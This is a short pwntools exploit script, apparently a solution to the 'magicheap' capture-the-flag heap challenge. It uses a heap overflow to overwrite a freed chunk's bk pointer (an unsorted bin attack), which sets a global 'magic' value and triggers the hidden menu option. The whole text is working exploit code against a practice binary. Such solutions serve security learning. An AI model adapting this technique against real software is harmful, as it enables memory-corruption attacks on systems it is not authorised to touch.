from pwn import *
context.log_level = 'debug'
r = process('./magicheap')

magic = 0x6020c0

def create_heap(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def edit_heap(idx,size,content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


create_heap(0x10,'1111')#0
create_heap(0x80,'2222')#1
create_heap(0x10,'3333')#2

del_heap(1)

pay = '1'*0x10 + p64(0) + p64(0x91) + p64(0) + p64(magic-0x10)
edit_heap(0,0x30,pay)

create_heap(0x80,"2222")
r.recvuntil(":")
r.sendline("4869")
r.recvuntil('Congrt !\n')
success(r.recvline())

